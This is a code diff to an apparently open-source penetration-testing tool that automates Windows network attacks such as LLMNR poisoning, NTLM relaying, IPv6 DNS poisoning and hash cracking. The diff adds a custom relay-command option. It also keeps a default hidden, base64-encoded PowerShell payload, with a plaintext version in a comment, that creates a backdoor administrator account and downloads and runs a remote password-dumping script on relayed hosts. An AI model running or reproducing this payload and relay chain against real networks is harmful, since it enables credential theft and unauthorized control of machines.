@@ -34,6 +34,7 @@ def parse_args():
     parser.add_argument("-s", "--skip", default='', help="Skip [rid/scf/responder/ntlmrelay/dns/crack] where the first 5 options correspond to attacks 1-5")
     parser.add_argument("-t", "--time", default='10', help="Number of minutes to run the LLMNR/Responder attack; defaults to 10m")
     parser.add_argument("-i", "--interface", help="Interface to use with Responder")
+    parser.add_argument("-c", "--command", help="Remote command to run upon successful NTLM relay")
     return parser.parse_args()
 
 def parse_nmap(args):
@@ -92,7 +93,9 @@ def nmap_status_printer(nmap_proc):
         if i % 30 == 0:
             x += .5
             print("[*] Nmap running: {} min".format(str(x)))
+
         time.sleep(1)
+
 
 def run_nse_scripts(args, hosts, nse_scripts_run):
     '''
@@ -735,7 +738,7 @@ def start_responder_llmnr(iface):
     print('[*] Responder-Session.log:')
     return resp_proc
 
-def run_relay_attack(iface):
+def run_relay_attack(iface, args):
     '''
     Start ntlmrelayx for ntlm relaying
     '''
@@ -743,11 +746,14 @@ def run_relay_attack(iface):
     resp_cmd = 'python2 submodules/Responder/Responder.py -wrd -I {}'.format(iface)
     resp_proc = run_proc(resp_cmd)
 
-# net user /add icebreaker P@ssword123456; net localgroup administrators icebreaker /add; IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/DanMcInerney/Obf-Cats/master/Obf-Cats.ps1'); Obf-Cats -pwds
+    if args.command:
+        remote_cmd = args.command
+    else:
+        # net user /add icebreaker P@ssword123456; net localgroup administrators icebreaker /add; IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/DanMcInerney/Obf-Cats/master/Obf-Cats.ps1'); Obf-Cats -pwds
+        remote_cmd = 'powershell -nop -exec bypass -w hidden -enc bgBlAHQAIAB1AHMAZQByACAALwBhAGQAZAAgAGkAYwBlAGIAcgBlAGEAawBlAHIAIABQAEAAcwBzAHcAbwByAGQAMQAyADMANAA1ADYAOwAgAG4AZQB0ACAAbABvAGMAYQBsAGcAcgBvAHUAcAAgAGEAZABtAGkAbgBpAHMAdAByAGEAdABvAHIAcwAgAGkAYwBlAGIAcgBlAGEAawBlAHIAIAAvAGEAZABkADsAIABJAEUAWAAgACgATgBlAHcALQBPAGIAagBlAGMAdAAgAE4AZQB0AC4AVwBlAGIAQwBsAGkAZQBuAHQAKQAuAEQAbwB3AG4AbABvAGEAZABTAHQAcgBpAG4AZwAoACcAaAB0AHQAcABzADoALwAvAHIAYQB3AC4AZwBpAHQAaAB1AGIAdQBzAGUAcgBjAG8AbgB0AGUAbgB0AC4AYwBvAG0ALwBEAGEAbgBNAGMASQBuAGUAcgBuAGUAeQAvAE8AYgBmAC0AQwBhAHQAcwAvAG0AYQBzAHQAZQByAC8ATwBiAGYALQBDAGEAdABzAC4AcABzADEAJwApADsAIABPAGIAZgAtAEMAYQB0AHMAIAAtAHAAdwBkAHMADQAKAA=='
+
     relay_cmd = ('python2 submodules/impacket/examples/ntlmrelayx.py -6 -wh Proxy-Service'
-                ' -of hashes/ntlmrelay-hashes -tf smb-signing-disabled-hosts.txt -wa 3'
-                ' -c "powershell -nop -exec bypass -w hidden -enc '
-                'bgBlAHQAIAB1AHMAZQByACAALwBhAGQAZAAgAGkAYwBlAGIAcgBlAGEAawBlAHIAIABQAEAAcwBzAHcAbwByAGQAMQAyADMANAA1ADYAOwAgAG4AZQB0ACAAbABvAGMAYQBsAGcAcgBvAHUAcAAgAGEAZABtAGkAbgBpAHMAdAByAGEAdABvAHIAcwAgAGkAYwBlAGIAcgBlAGEAawBlAHIAIAAvAGEAZABkADsAIABJAEUAWAAgACgATgBlAHcALQBPAGIAagBlAGMAdAAgAE4AZQB0AC4AVwBlAGIAQwBsAGkAZQBuAHQAKQAuAEQAbwB3AG4AbABvAGEAZABTAHQAcgBpAG4AZwAoACcAaAB0AHQAcABzADoALwAvAHIAYQB3AC4AZwBpAHQAaAB1AGIAdQBzAGUAcgBjAG8AbgB0AGUAbgB0AC4AYwBvAG0ALwBEAGEAbgBNAGMASQBuAGUAcgBuAGUAeQAvAE8AYgBmAC0AQwBhAHQAcwAvAG0AYQBzAHQAZQByAC8ATwBiAGYALQBDAGEAdABzAC4AcABzADEAJwApADsAIABPAGIAZgAtAEMAYQB0AHMAIAAtAHAAdwBkAHMADQAKAA==')
+                ' -of hashes/ntlmrelay-hashes -tf smb-signing-disabled-hosts.txt -wa 3 -c "{}"'.format(remote_cmd))
     ntlmrelay_proc = run_proc(relay_cmd)
 
     return resp_proc, ntlmrelay_proc
@@ -873,7 +879,8 @@ def get_responder_hashes(line, prev_creds):
         hash_split = ntlm_hash.split(':')
         user = hash_split[2]+'\\'+hash_split[0]
 
-        if user not in prev_creds:
+        # Don't bother with cracking machine accounts (WIN10$)
+        if '$' not in user and user not in prev_creds:
             prev_creds.append(user)
             print('[+] Hash found for {}!'.format(user))
             if ntlm_hash.count(':') == 5:
@@ -985,7 +992,7 @@ def do_ntlmrelay(prev_creds, args, iface):
     mitm6_proc = None
 
     print('\n[*] Attack 4: NTLM relay with Responder and ntlmrelayx')
-    resp_proc, ntlmrelay_proc = run_relay_attack(iface)
+    resp_proc, ntlmrelay_proc = run_relay_attack(iface, args)
 
     if 'dns' not in args.skip:
         print('\n[*] Attack 5: IPv6 DNS Poison')
@@ -1123,6 +1130,7 @@ def main(report, args):
         # ATTACK 1: RID Cycling into reverse bruteforce
         if 'rid' not in args.skip.lower():
             prev_creds, prev_users, domains = smb_reverse_brute(loop, hosts, args, passwords, prev_creds, prev_users)
+        loop.close()
 
         # ATTACK 2: SCF file upload to writeable shares
         parse_nse(hosts, args, iface)
@@ -1136,7 +1144,12 @@ def main(report, args):
         print('\n[*] Attack 3: LLMNR/NBTS/mDNS poisoning for NTLM hashes')
         prev_lines = []
         resp_proc = start_responder_llmnr(iface)
-        time.sleep(2)
+
+        # Give Responder a pause to close
+        try:
+            time.sleep(2)
+        except KeyboardInterrupt:
+            sys.exit()
 
         # Check for hashes for set amount of time
         timeout = time.time() + 60 * int(args.time)
@@ -1168,3 +1181,7 @@ if __name__ == "__main__":
         exit('[-] Run as root')
     report = parse_nmap(args)
     main(report, args)
+
+# Future
+# -c option to specify what ntlmrelay runs
+# xterm windows with empire and deathstar? might be too specific to gui interfaces but would be neat option
